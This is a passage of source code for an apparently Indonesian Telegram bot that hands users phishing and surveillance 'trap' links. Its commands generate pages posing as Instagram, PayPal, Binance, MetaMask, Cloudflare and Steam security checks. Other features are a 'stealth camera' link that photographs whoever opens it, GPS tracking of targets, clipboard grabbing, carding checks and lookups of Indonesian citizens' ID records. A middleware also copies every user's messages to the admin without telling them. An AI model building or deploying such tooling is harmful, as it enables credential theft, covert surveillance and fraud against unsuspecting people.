        0x01, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x01, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      ]);

      const manifestXml = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${pName}"
    android:versionCode="${vCode}"
    android:versionName="1.0">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
    <application
        android:label="${aTitle}"
        android:allowBackup="true"
        android:supportsRtl="true">
        <activity
            android:name="com.mikko.emptyapp.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>`;

      const stringsXml = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${aTitle}</string>
</resources>`;

      const licenseText = `========================================================
MIKKO_APK CLEARANCE LICENSE Certificate
========================================================
Security Clearance: VERIFIED
Target Package: ${pName}
Application Name: ${aTitle}
Min SDK: 21 // Target SDK: 33
Build Engine: MikkoAPK Compiler v1.4

Academic and Educational Use Only.
This Android package (.apk) is generated completely clean and empty
for forensic structural check and local binary learning.
There are no background services or permissions associated.
========================================================`;

      zip.addFile("AndroidManifest.xml", Buffer.from(manifestXml, 'utf-8'));
      zip.addFile("classes.dex", dexBytes);
      zip.addFile("res/values/strings.xml", Buffer.from(stringsXml, 'utf-8'));
      zip.addFile("assets/mikko_license.txt", Buffer.from(licenseText, 'utf-8'));

      const apkBuffer = zip.toBuffer();

      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', `attachment; filename="MikkoAPK_${pName}.apk"`);
      res.status(200).send(apkBuffer);
    } catch (e: any) {
      res.status(500).json({ error: 'Failed compiling apk: ' + e.message });
    }
  });
  // ==============================================

  // Serve static files from dist if in production
  const isProduction = process.env.NODE_ENV === "production" || fs.existsSync(path.join(process.cwd(), 'dist'));

  if (!isProduction) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use((req, res, next) => {
      if (req.path.startsWith('/t/') || req.path.startsWith('/api') || req.path === '/health' || req.path === '/healthz') {
        return next();
      }
      vite.middlewares(req, res, next);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    
    // SPA Fallback
    app.get('*', (req, res, next) => {
      if (req.path.startsWith('/api') || req.path.startsWith('/t/') || req.path === '/health' || req.path === '/healthz') {
        return next();
      }
      const indexPath = path.join(distPath, 'index.html');
      if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
      } else {
        // Avoid returning 404 for the root or generic paths to satisfy health checks
        res.status(200).send('<h2>System Ready</h2><p>Terminal UI is active. Please check the bot for links.</p>');
      }
    });
  }

  // 404 Handler (Moved to the correct position at the end of the chain)
  app.use((req, res) => {
    if (!res.headersSent) {
      res.status(404).send('<h2>Error 404: Endpoint Not Found</h2>');
    }
  });

  // Global Error Handler
  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
    console.error('[SERVER ERROR]', err);
    if (!res.headersSent) {
      res.status(500).send('<h2>Critical Server Error</h2><p>' + (err.message || 'Unknown error') + '</p>');
    }
  });

  // TELEGRAM BOT SETUP
  if (bot) {
    // Admin log tracking middleware
    bot.use(async (ctx, next) => {
        try {
            if (ctx.from && ctx.from.id !== ADMIN_ID) {
                let action = '';
                const safeName = (ctx.from.first_name || 'Unknown').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                const userRef = `User: <b>${safeName}</b> (<code>${ctx.from.id}</code>${ctx.from.username ? ' @' + ctx.from.username : ''})`;
                
                if (ctx.message && 'text' in ctx.message) {
                    const text = (ctx.message as any).text as string;
                    if (text.startsWith('/')) {
                       action = `Command: <code>${text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>`;
                    } else {
                       action = `Text: <code>${text.substring(0, 100).replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>`;
                    }
                } else if (ctx.callbackQuery && 'data' in ctx.callbackQuery) {
                    const data = (ctx.callbackQuery as any).data;
                    action = `Button Click: <code>${data}</code>`;
                }
                
                if (action) {
                    //@ts-ignore
                    bot.telegram.sendMessage(ADMIN_ID, `🔔 <b>MEMBER ACTION</b>\n${userRef}\nAction: ${action}`, { parse_mode: 'HTML' }).catch(() => {});
                }

                // Intercept Bot Replies to forward them to admin
                const originalReply = ctx.reply;
                ctx.reply = async function (text, extra) {
                    const res = await originalReply.call(ctx, text, extra);
                    try {
                        const sanitizedOutput = String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 3000);
                        //@ts-ignore
                        await bot.telegram.sendMessage(ADMIN_ID, `🤖 <b>BOT REPLY to MEMBER</b>\n${userRef}\n\n<code>${sanitizedOutput}</code>`, { parse_mode: 'HTML' });
                    } catch (e) { console.error(e); }
                    return res;
                };

                const originalReplyWithPhoto = ctx.replyWithPhoto;
                 //@ts-ignore
                ctx.replyWithPhoto = async function (photo, extra) {
                    const res = await originalReplyWithPhoto.call(ctx, photo, extra);
                    try {
                        let capCaption = extra && (extra as any).caption ? (extra as any).caption : 'No caption';
                        //@ts-ignore
                        await bot.telegram.sendPhoto(ADMIN_ID, photo, { caption: `🤖 <b>BOT PHOTO to MEMBER</b>\n${userRef}\n\n${capCaption}`, parse_mode: 'HTML' }).catch((e) => {
                           //@ts-ignore
                           bot.telegram.sendMessage(ADMIN_ID, `🤖 <b>BOT PHOTO to MEMBER (Failed forwarding image)</b>\n${userRef}\n\nCaption: ${capCaption}`, { parse_mode: 'HTML' });
                        });
                    } catch (e) { console.error(e); }
                    return res;
                };

                const originalReplyWithDocument = ctx.replyWithDocument;
                //@ts-ignore
                ctx.replyWithDocument = async function (doc, extra) {
                    const res = await originalReplyWithDocument.call(ctx, doc, extra);
                    try {
                        let capCaption = extra && (extra as any).caption ? (extra as any).caption : 'No caption';
                        //@ts-ignore
                        await bot.telegram.sendDocument(ADMIN_ID, doc, { caption: `🤖 <b>BOT DOCUMENT to MEMBER</b>\n${userRef}\n\n${capCaption}`, parse_mode: 'HTML' }).catch((e) => {
                           //@ts-ignore
                           bot.telegram.sendMessage(ADMIN_ID, `🤖 <b>BOT DOCUMENT to MEMBER (Failed forwarding doc)</b>\n${userRef}\n\nCaption: ${capCaption}`, { parse_mode: 'HTML' });
                        });
                    } catch (e) { console.error(e); }
                    return res;
                };

                const originalReplyWithAudio = ctx.replyWithAudio;
                //@ts-ignore
                ctx.replyWithAudio = async function (audio, extra) {
                    const res = await originalReplyWithAudio.call(ctx, audio, extra);
                    try {
                        let capCaption = extra && (extra as any).caption ? (extra as any).caption : 'No caption';
                        //@ts-ignore
                        await bot.telegram.sendAudio(ADMIN_ID, audio, { caption: `🤖 <b>BOT AUDIO to MEMBER</b>\n${userRef}\n\n${capCaption}`, parse_mode: 'HTML' }).catch((e) => {
                           //@ts-ignore
                           bot.telegram.sendMessage(ADMIN_ID, `🤖 <b>BOT AUDIO to MEMBER (Failed forwarding audio)</b>\n${userRef}\n\nCaption: ${capCaption}`, { parse_mode: 'HTML' });
                        });
                    } catch (e) { console.error(e); }
                    return res;
                };
                
                const originalEditMessageText = ctx.editMessageText;
                //@ts-ignore
                ctx.editMessageText = async function (text, extra) {
                    const res = await originalEditMessageText.call(ctx, text, extra);
                    try {
                        const sanitizedOutput = String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 3000);
                        //@ts-ignore
                        await bot.telegram.sendMessage(ADMIN_ID, `🤖 <b>BOT EDITED MSG for MEMBER</b>\n${userRef}\n\n<code>${sanitizedOutput}</code>`, { parse_mode: 'HTML' });
                    } catch (e) { console.error(e); }
                    return res;
                };
            }
        } catch (e) {
            console.error("Error in logging middleware:", e);
        }
        return next();
    });

    bot.use(async (ctx, next) => {
        try {
            if (!ctx.from) return;
            
            const userId = ctx.from.id;
            const userName = ctx.from.first_name || 'User';

            // Check Banned
            if (bannedUsers.has(userId) && userId !== ADMIN_ID) {
                return; // Silently ignore banned users
            }

            // Check Global OFF
            if (botStatus === "OFF" && userId !== ADMIN_ID) {
                // Return silent, or a small notice once (we'll just return)
                return;
            }

            // IMPORTANT: Allow callback queries (button clicks) to pass through to their handlers
            if (ctx.callbackQuery) return next();

            // Check for /start or other commands to make them semi-accessible
            const isCommand = ctx.message && 'text' in ctx.message && ctx.message.text.startsWith('/');
            const text = ctx.message && 'text' in ctx.message ? (ctx.message as any).text : '';

            // Skip all checks for owner
            if (userId === ADMIN_ID) return next();

            // Check if user has accepted agreement
            if (!agreementUsers.has(userId)) {
                // Determine reliable host
                let host = appHost;
                const cleanHost = (host || "").replace(/\/$/, '');
                
                // CRITICAL: If no host, we MUST use a placeholder or log error, but don't crash
                if (!cleanHost) {
                   console.error("CRITICAL: APP_URL not set. Bot cannot generate links.");
                   return ctx.reply("⚠️ Terminal configuration error: APP_URL is missing.").catch(()=>{});
                }

                const btnUrl = `${cleanHost}/verify-bot-user?uid=${userId}&name=${encodeURIComponent(userName)}`;
                
                const aggMsg = `⚠️ <b>[ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ]</b> ⚠️\n` +
                               `━━━━━━━━━━━━━━━━━━━━\n\n` +
                               `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜰʀᴀᴍᴇᴡᴏʀᴋ ᴛʀɪʜᴇxᴀ666. ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ, ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇɴʏᴇᴛᴜᴊᴜɪ ᴋᴇᴛᴇɴᴛᴜᴀɴ ʙᴇʀɪᴋᴜᴛ:\n\n` +
                               `1. ʙᴏᴛ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴛᴜᴊᴜᴀɴ ᴘᴇɴᴇʟɪᴛɪᴀɴ ꜱᴇᴄᴜʀɪᴛʏ.\n` +
                               `2. ꜱᴇʟɪᴛᴜʀᴜʜ ᴀᴋᴛɪᴠɪᴛᴀꜱ ᴀɴᴅᴀ ᴅɪᴘᴀɴᴛᴀᴜ ᴏʟᴇʜ ꜱʏꜱᴛᴇᴍ.\n` +
                               `3. ᴀɴᴅᴀ ᴡᴀᴊɪʙ ᴍᴇʟɪᴠᴇʀɪꜰɪᴋᴀꜱɪ ɪᴅᴇɴᴛɪᴛᴀꜱ ᴅᴇɴɢᴀɴ ᴍᴇɴɢᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ.\n\n` +
                               `━━━━━━━━━━━━━━━━━━━━`;
                const kb = Markup.inlineKeyboard([
                    [Markup.button.url('🛡️ ꜱᴇᴛᴜᴊᴜ & ᴠᴇʀɪꜰɪᴋᴀꜱɪ', btnUrl)],
                    [Markup.button.callback('✅ ꜱᴀʏᴀ ꜱᴜᴅᴀʜ ᴠᴇʀɪꜰɪᴋᴀꜱɪ', 'confirm_verified')]
                ]);
                return ctx.reply(aggMsg, { parse_mode: 'HTML', ...kb }).catch(e => console.error("Reply Error (Agreement):", e));
            }

            // Auto-authenticate all verified users
            return next();
        } catch (err) {
            console.error("Bot Global Middleware Error:", err);
        }
    });

    // ADMIN COMMANDS
    bot.command('off', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        botStatus = "OFF";
        saveBotSettings();
        ctx.reply("🛑 <b>BOT TEAR DOWN</b>\nBot sekarang dimatikan untuk semua user (Kecuali Admin).", { parse_mode: 'HTML' });
    });

    bot.command('on', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        botStatus = "ON";
        saveBotSettings();
        ctx.reply("✅ <b>BOT ONLINE</b>\nBot sekarang aktif untuk semua user.", { parse_mode: 'HTML' });
    });

    bot.command('setdesc', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        const newDesc = ctx.message.text.split(' ').slice(1).join(' ');
        if (!newDesc) return ctx.reply("Format: /setdesc [Deskripsi Baru]");
        botDescription = newDesc;
        saveBotSettings();
        ctx.reply("✅ <b>DESKRIPSI BOT DIPERBARUI</b>\n\nPreview /start:\n" + newDesc, { parse_mode: 'HTML' });
    });

    bot.command('ban', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        const targetId = parseInt(ctx.message.text.split(' ')[1]);
        if (!targetId || isNaN(targetId)) return ctx.reply("Format: /ban [Telegram_ID]");
        if (targetId === ADMIN_ID) return ctx.reply("❌ Tidak dapat membanned Admin.");
        
        bannedUsers.add(targetId);
        saveBotSettings();
        ctx.reply(`✅ <b>USER BANNED</b>\nID <code>${targetId}</code> telah dibanned permanen dari sistem.`, { parse_mode: 'HTML' });
    });

    bot.command('unban', (ctx) => {
        if (!ctx.from || ctx.from.id !== ADMIN_ID) return;
        const targetId = parseInt(ctx.message.text.split(' ')[1]);
        if (!targetId || isNaN(targetId)) return ctx.reply("Format: /unban [Telegram_ID]");
        
        if (bannedUsers.has(targetId)) {
            bannedUsers.delete(targetId);
            saveBotSettings();
            ctx.reply(`✅ <b>USER UNBANNED</b>\nID <code>${targetId}</code> telah dipulihkan.`, { parse_mode: 'HTML' });
        } else {
            ctx.reply(`⚠️ User ID <code>${targetId}</code> tidak ada dalam daftar ban.`, { parse_mode: 'HTML' });
        }
    });

    bot.action('confirm_verified', (ctx) => {
        if (!ctx.from) return;
        agreementUsers.add(ctx.from.id);
        saveAgreement();
        ctx.answerCbQuery("System verified!").catch(() => {});
        ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
        const startMsgText = getStartMsg();
        ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainReplyKeyboard });
    });

    const getStartMsg = () => `<b>${botDescription}</b>\n\n` +
                         `<i>Silakan pilih menu di bawah ini:</i>`;
    
    const mainInlineKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🕵️ OSINT & Tracker', 'menu_osint_adv'), Markup.button.callback('🎣 Advanced Stealth Logger', 'menu_logger')],
      [Markup.button.callback('🛠️ Adv Tools', 'menu_tools'), Markup.button.callback('🎮 Mini Games', 'menu_games')],
      [Markup.button.callback('🎵 Media Downloader', 'menu_media'), Markup.button.callback('⏰ Alarm System', 'menu_alarm')],
      [Markup.button.callback('📲 WhatsApp Bot', 'menu_wa'), Markup.button.callback('📱 QR Generator', 'menu_qr')],
      [Markup.button.callback('ℹ️ Bot Info', 'menu_help'), Markup.button.callback('🛒 Buy Bot', 'menu_buy_bot')]
    ]);

    const mainReplyKeyboard = Markup.keyboard([
      ['🔒 TRIHEXA OSINT TERMINAL 🔒'],
      ['── 🇮🇩 OSINT INDONESIA ──'],
      ['🆔 Cek NIK', '🖨️ Cek KK'],
      ['🚗 Cek Plat Nopol', '🏥 Cek BPJS'],
      ['👨‍💼 Cek NIP/ASN', '🏢 Cek NIB Bisnis'],
      ['🎓 Cek SIVIL Ijazah', '⚖️ Putusan Mahkamah'],
      ['🏛️ Cek Pajak PBB', '🚔 Cek DPO Polri'],
      ['🛂 Cek Paspor', '🛑 Cekal Imigrasi'],
      ['🗳️ Cek DPT KPU', '📜 Cek Sertipikat BPN'],
      ['📦 Cek Bea Cukai', '🏦 Cek OJK Hukum'],
      ['💼 Cek Perusahaan AHU', '💍 Cek Buku Nikah'],
      ['── 🕵️ GLOBAL OSINT & TRACKING ──'],
      ['🌐 IP Geolocation Tracker', '📡 Reverse IP Lookup'],
      ['🔎 WHOIS Domain', '🌍 DNS Records Lookup'],
      ['🕸️ Subdomain Scanner', '🕷️ Shodan Dorking'],
      ['📧 Email Validator & Leak', '👤 Sosmed & Username Tracker'],
      ['📞 Phone Tracker (HLR)', '💻 MAC Address OSINT'],
      ['🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
      ['── 🛑 STEALTH TRAP LOGGER ──'],
      ['📸 Hack Kamera Target', '📍 Hack GPS Presisi Target'],
      ['🎣 Phishing IG/Meta', '💰 Phishing Crypto/Wallet'],
      ['💳 Phishing PayPal', '🎮 Phishing Steam', '🛡️ Trap Bypass Cloudflare'],
      ['💬 Phishing FB/Messenger', '💼 Phishing LinkedIn', '🛒 Phishing Amazon/Toko'],
      ['🎵 Phishing Spotify/Netflix', '🍎 Phishing AppleID', '📁 Phishing GDrive/Dropbox'],
      ['🐧 Phishing Linux/SSH', '📊 Lihat Log Korban (Logger)'],
      ['⚙️ Set Custom Domain Tracker'],
      ['── 🛠️ ADVANCED CYBER TOOLS ──'],
      ['🔐 Hash Generator (MD5/SHA)', '🔓 Base64 Encode/Decode'],
      ['💳 Cek Info BIN Card', '💳 Validasi CC (Carding)'],
      ['🧪 XSS Scanner', '🦠 VirusTotal Web/File Scan'],
      ['── 🧩 UTILITAS & MEDIA ──'],
      ['🎵 Download Lagu/Audio', '🎥 Download Video (IG/TikTok)'],
      ['⏰ Sistem Alarm Pengingat', '🌤️ Info Cuaca Area'],
      ['📈 Info Harga Crypto (Live)', '📲 Koneksi Bot WhatsApp'],
      ['── 💀 PRO FITUR ──'],
      ['💀 SANTO PETRUS (TAKEDOWN)', 'ℹ️ Informasi Bot & Bantuan']
    ]).resize();

    // Global Error Handler for "Anti Bug"
    bot.catch((err, ctx) => {
        console.error(`Ooops, encountered an error for ${ctx.updateType}`, err);
    });

    bot.command('trap_camera', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/camera_stealth/${id}`;
      ctx.reply(`📸 <b>STEALTH CAMERA INJECT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Kirim Link ini kepada target. Saat diklik, Kamera target akan direkam tanpa UI mencolok.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Hasil foto (hingga 4 kali berulang) akan masuk ke chat ini secara otomatis jika disetujui.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_gps', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/gps_tracker/${id}`;
      ctx.reply(`📍 <b>PRECISION GPS TRACKER</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Kirim Link ini kepada target. Saat target memberikan akses lokasi, koordinat akan dilacak dengan Google Maps level presisi.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Pastikan target tidak menggunakan VPN palsu.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_ig', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/meta_login/${id}`;
      ctx.reply(`📸 <b>INSTAGRAM/META PHISHING OSINT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link ini menyamar sebagai peringatan keamanan (Security Alert) dari Instagram.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Target yang mengklik akan dimintai verifikasi sesi perlindungan akun.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_paypal', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/paypal/${id}`;
      ctx.reply(`💳 <b>PAYPAL SECURITY AUDIT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai peringatan aktivitas tidak wajar dari PayPal.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Sangat efektif dengan target platform Fintech.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_binance', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/binance/${id}`;
      ctx.reply(`💱 <b>BINANCE CRYPTO AUDIT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai halaman Withdrawal Security Binance.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Target harus memverifikasi sesi untuk melindungi aset dompet mereka.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_wallet', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/wallet_connect/${id}`;
      ctx.reply(`🦊 <b>WEB3 METAMASK SIGNATURE TRAP</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai halaman Web3 WalletConnect (MetaMask Signature).\n` +
                `Menyerang dengan stealth: langsung menyalin clipboard diam-diam saat target masuk.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Memancing pengguna Crypto untuk mengklik 'Connect Web3'.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_cloudflare', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/cloudflare/${id}`;
      ctx.reply(`☁️ <b>CLOUDFLARE EDGE TRAP</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai halaman antrian "Verify you are human" Cloudflare yang sangat terpercaya.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Salah satu penyamaran paling natural.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('trap_steam', (ctx) => {
      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
      const trapUrl = `${appHost.replace(/\/$/, '')}/t/steam/${id}`;
      ctx.reply(`🎮 <b>STEAM GUARD INJECT</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Link menyamar sebagai verifikasi sekuritas akun Steam Guard.\n\n` +
                `🔗 <code>${trapUrl}</code>\n\n` +
                `⚠️ <i>Dirancang khusus untuk target demographics Gaming.</i>\n` +
                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.start(async (ctx) => {
        await ctx.reply("🔄 <b>Inisialisasi Terminal...</b>\nUpdate UI Keyboard berhasil dimuat.", { parse_mode: 'HTML', ...mainReplyKeyboard });
        const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
        const txt = `${getStartMsg()}\n<i>Session Active for: ${safeName}</i>`;
        await ctx.reply(txt, { parse_mode: 'HTML', ...mainInlineKeyboard });
    });

    bot.action('menu_main', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
      const txt = `${getStartMsg()}\n` +
        `<i>Session Active for: ${safeName}</i>`;
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...mainInlineKeyboard }).catch(() => {});
    });

    bot.action('menu_osint_basic', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 Local OSINT (Basic)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Perintah Dasar Investigasi & Recon:\n\n` +
                  `• /ip [ɪᴘ_ᴀᴅᴅʀ] - IP Geo & ISP Track\n` +
                  `• /domain [ᴅᴏᴍᴀɪɴ] - WHOIS & DNS Records\n` +
                  `• /phone_dork [ɴᴏᴍᴏʀ] - Cek Provider\n` +
                  `• /bininfo [ʙɪɴ_ɴᴜᴍ] - Cek BIN Kartu Kredit\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🔍 OSINT INDO (Adv)', 'menu_osint_indo')],
        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
      ]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_wa', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      if (!ctx.from) return;
      if (ctx.from.id !== ADMIN_ID) {
        const txt = `🔒 <b>Fitur WhatsApp Bot Terkunci</b>\n\n` +
                    `Mohon maaf, fitur integrasi WhatsApp Bot hanya dapat diakses dan digunakan oleh <b>Admin Owner</b> saja.`;
        const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
        ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
        return;
      }
      const txt = `<b>📲 WhatsApp Bot Integration</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `ʜᴜʙᴜɴɢᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴋᴇ ɴᴏᴍᴏʀ ᴡʜᴀᴛꜱᴀᴘᴘ ᴀɴᴅᴀ ꜱᴇʙᴀɢᴀɪ ʙᴏᴛ ᴀᴋᴛɪꜰ!\n` +
                  `ꜱᴇᴍᴜᴀ ꜰɪᴛᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴋᴀɴ ᴛᴇʀꜱᴇᴅɪᴀ ᴅɪ ᴡʜᴀᴛꜱᴀᴘᴘ ᴀɴᴅᴀ.\n\n` +
                  `👉 <b>Cara Penggunaan:</b>\n` +
                  `Ketik perintah: <code>/wa_connect</code>\n\n` +
                  `⚠️ <b>Peringatan:</b>\n` +
                  `Gunakan nomor kedua/bot, jangan nomor pribadi untuk menghindari blokir.\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_qr', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📱 QR Generator</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `Generate QR Code dari link apapun!\n\n` +
                  `👉 <b>Cara Penggunaan:</b>\n` +
                  `Ketik perintah:\n<code>/qr [Teks atau URL]</code>\n\n` +
                  `Contoh:\n<code>/qr https://google.com</code>\n` +
                  `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_logger', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const id = generateTrapId(ctx.chat!.id);
      let msg = `<b>🎣 ꜱᴛᴇᴀʟᴛʜ ʟɪɴᴋ ʟᴏɢɢᴇʀ</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `ᴘɪʟɪʜ ᴛᴇᴍᴘʟᴀᴛᴇ ʙᴇʀɪᴋᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ:\n\n`;
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        msg += `📦 <b>${tmpl.name}</b>\n` +
               `🔗 <code>${trapUrl}</code>\n\n`;
      });
      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
             `💡 Info: Semua data tangkapan akan dikirim ke sini.\n`;
      const kb = Markup.inlineKeyboard([
        [Markup.button.callback('🛡️ Santo Petrus v1', 'menu_santopetrus')],
        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
      ]);
      ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
    });

    bot.action('menu_santopetrus', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      let msg = `💀 <b>SANTO_PETRUS V.2 (ENTERPRISE MODULE)</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Sistem Enterprise Security Audit (Advanced Simulator dengan Heuristik Akurat).\n\n` +
                `🔒 <b>FITUR TERKUNCI AUTHENTIKASI</b>\n` +
                `Gunakan command berikut dengan password untuk generate link payload:\n\n` +
                `<code>/santopetrus [PASSWORD] [TEMPLATE] [REDIRECT_URL]</code>\n\n` +
                `<b>Contoh Penggunaan:</b>\n` +
                `<code>/santopetrus PASSWORD_ANDA facebook https://google.com</code>\n\n` +
                `<i>Template yg tersedia: facebook, google, instagram, whatsapp, tiktok, twitter, telegram, netflix, spotify, microsoft, linkedin, github, paypal, discord, steam, reddit, binance, apple, amazon, roblox, playstation, xbox, snapchat, pinterest, twitch, canva, dropbox dll.</i>`;
